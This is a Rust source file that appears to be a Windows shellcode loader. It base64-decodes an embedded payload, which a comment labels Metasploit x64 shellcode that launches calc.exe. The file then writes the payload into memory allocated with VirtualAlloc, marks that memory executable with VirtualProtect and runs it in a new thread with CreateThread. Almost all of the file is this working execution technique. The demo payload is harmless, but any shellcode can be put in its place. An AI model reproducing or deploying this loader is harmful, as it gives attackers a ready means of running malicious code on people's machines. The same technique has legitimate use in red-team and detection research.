use std::error::Error;
use std::mem::transmute;

use base64::{Engine as _, engine::general_purpose};

use std::ptr::{copy, null, null_mut};

use windows_sys::Win32::Foundation::{GetLastError, FALSE, WAIT_FAILED, CloseHandle};

use windows_sys::Win32::System::Memory::PAGE_PROTECTION_FLAGS;
use windows_sys::Win32::System::Memory::PAGE_READWRITE;
use windows_sys::Win32::System::Memory::PAGE_EXECUTE_READ;
use windows_sys::Win32::System::Memory::MEM_COMMIT;
use windows_sys::Win32::System::Memory::MEM_RESERVE;
use windows_sys::Win32::System::Memory::VirtualAlloc;
use windows_sys::Win32::System::Memory::VirtualProtect;
use windows_sys::Win32::System::Threading::{CreateThread, WaitForSingleObject};

fn get_shellcode_base64() -> Vec<u8> {
    //msfconsole x64 pop calc.exe
    let base64_shell_code = "/EiD5PDowAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdCLgIgAAABIhcB0Z0gB0FCLSBhEi0AgSQHQ41ZI/8lBizSISAHWTTHJSDHArEHByQ1BAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEgB0EFYQVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpV////11IugEAAAAAAAAASI2NAQEAAEG6MYtvh//Vu/C1olZBuqaVvZ3/1UiDxCg8BnwKgPvgdQW7RxNyb2oAWUGJ2v/VY2FsYy5leGUA";
    general_purpose::STANDARD.decode(base64_shell_code).unwrap()
}

fn main() {
    let shell_code = get_shellcode_base64();
    match load(shell_code) {
        Ok(_) => {},
        Err(e) => {
            println!("{:?}",e.to_string());
        }
    }
}


fn load(shell_code: Vec<u8>) -> Result<(), Box<dyn Error>> {
    unsafe {

        let base_addr = VirtualAlloc(
            null(),
            shell_code.len().try_into().unwrap(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE
        );

        if base_addr.is_null() {
            panic!("[-] Couldn't allocate memory to current process {}!", GetLastError())
        }

        //copy shellcode into the new memory region
        copy(shell_code.as_ptr() as  _, base_addr, shell_code.len());


        let mut old_permissions: PAGE_PROTECTION_FLAGS = PAGE_READWRITE;
        
        if VirtualProtect(base_addr.cast(), shell_code.len(), PAGE_EXECUTE_READ, &mut old_permissions) == FALSE {
            panic!("[-] Couldn't change memory protection: {}!", GetLastError())
        }

        let trans_addr = transmute(base_addr);
        let thread_handle = CreateThread(null(), 0, trans_addr, null(), 0, null_mut());
        

        WaitForSingleObject(thread_handle, WAIT_FAILED);

        CloseHandle(thread_handle);
        Ok(())
    }
}